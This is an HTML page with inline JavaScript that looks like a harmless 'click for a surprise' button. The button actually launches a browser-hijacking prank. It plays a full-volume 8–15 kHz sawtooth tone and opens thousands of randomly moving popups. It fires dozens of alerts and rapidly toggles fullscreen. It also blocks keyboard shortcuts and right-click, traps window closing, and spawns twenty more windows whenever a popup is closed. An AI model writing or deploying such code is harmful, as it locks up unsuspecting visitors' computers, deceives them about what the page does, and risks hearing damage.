<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const music = document.getElementById('music');
        let popupCount = 0;
        const maxPopups = 5000;

        const popupMessages = [
            "SURPRISE",
            "CONGRATULATIONS",
            "YOU WON",
            "FREE GIFT",
            "IMPORTANT ALERT",
            "WARNING",
            "ANNOUNCEMENT",
            "PARTY TIME",
            "EMERGENCY",
            "BOOM",
            "HAPPY DAY",
            "RAINBOWS",
            "UNICORNS",
            "PIZZA TIME",
            "GAME OVER",
            "NEW MESSAGE",
            "NOTIFICATION",
            "WISH GRANTED",
            "DRAMA",
            "BLAST OFF"
        ];

        const activePopups = [];

        function createPopup() {
            if (popupCount >= maxPopups) return;
            
            const popup = window.open('', '_blank', 'width=400,height=300,fullscreen');
            if (popup) {
                popupCount++;
                activePopups.push(popup);
                const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
                popup.document.write(`
                    <html>
                    <head>
                        <title>Popup #${popupCount}</title>
                        <style>
                            body {
                                font-family: Arial, sans-serif;
                                display: flex;
                                justify-content: center;
                                align-items: center;
                                height: 100vh;
                                margin: 0;
                                background: #333333;
                            }
                            h1 {
                                color: #999999;
                                font-size: 24px;
                                text-align: center;
                            }
                            p {
                                color: #666666;
                                text-align: center;
                            }
                        </style>
                    </head>
                    <body>
                        <h1>${randomMessage}</h1>
                        <p>Popup #${popupCount} of ${maxPopups}</p>
                        <p style="font-size: 12px;">You cannot close this window</p>
                    </body>
                    </html>
                `);
                
                // Make popup extremely hard to close
                popup.onbeforeunload = function() {
                    return "Are you sure you want to leave?";
                };
                
                // Try to prevent closing and spawn many new windows
                popup.onunload = function() {
                    for(let i = 0; i < 20; i++) {
                        window.open('', '_blank', 'width=400,height=300,fullscreen');
                    }
                };
                
                // Prevent right-click
                popup.document.addEventListener('contextmenu', e => e.preventDefault());
                
                // Prevent keyboard shortcuts
                popup.document.addEventListener('keydown', e => {
                    if(e.ctrlKey || e.altKey || e.metaKey) {
                        e.preventDefault();
                    }
                });
                
                // Position popup randomly
                const randomX = Math.random() * (screen.width - 400);
                const randomY = Math.random() * (screen.height - 300);
                popup.moveTo(randomX, randomY);
                
                // Keep main window focused
                window.focus();
            }
        }

        function movePopups() {
            activePopups.forEach(popup => {
                if (popup && !popup.closed) {
                    const randomX = Math.random() * (screen.width - 400);
                    const randomY = Math.random() * (screen.height - 300);
                    popup.moveTo(randomX, randomY);
                }
            });
        }

        let isFullscreen = false;
        function toggleFullscreen() {
            activePopups.forEach(popup => {
                if (popup && !popup.closed) {
                    try {
                        if (isFullscreen) {
                            popup.document.exitFullscreen();
                        } else {
                            popup.document.documentElement.requestFullscreen();
                        }
                    } catch(e) {
                        // Fullscreen may not be allowed
                    }
                }
            });
            isFullscreen = !isFullscreen;
        }

        function createAlerts() {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
                    alert(`${randomMessage}\n\nAlert #${i + 1} of 50`);
                }, i * 200);
            }
        }

        function playHighPitchNoise() {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            oscillator.type = 'sawtooth';
            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
            
            gainNode.gain.setValueAtTime(1, audioContext.currentTime);
            
            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.start();
            
            // Modulate frequency for more piercing effect
            setInterval(() => {
                const freq = 8000 + Math.random() * 7000;
                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
            }, 50);
        }

        // Add confirmation dialog when trying to close main window
        window.addEventListener('beforeunload', function (event) {
            event.preventDefault();
            event.returnValue = '';
        });

        // Prevent right-click on main window
        document.addEventListener('contextmenu', e => e.preventDefault());

        // Prevent keyboard shortcuts on main window
        document.addEventListener('keydown', e => {
            if(e.ctrlKey || e.altKey || e.metaKey) {
                e.preventDefault();
            }
        });

        button.addEventListener('click', () => {
            // Play ear-piercing high-pitch noise
            playHighPitchNoise();
            
            // Create massive amounts of popups
            for (let i = 0; i < 500; i++) {
                setTimeout(createPopup, i * 10);
            }
            
            // Create alerts immediately
            setTimeout(createAlerts, 200);
            
            // Keep spawning popups continuously
            setInterval(() => {
                if (popupCount < maxPopups) {
                    createPopup();
                }
            }, 10);
            
            // Move popups extremely fast
            setInterval(movePopups, 10);
            
            // Toggle fullscreen extremely fast
            setInterval(toggleFullscreen, 30);
            
            // Keep main window focused continuously
            setInterval(() => {
                window.focus();
            }, 50);
            
            // Change button text
            button.textContent = 'TOO LATE';
            button.disabled = true;
        });
    </script>
</body>
</html>
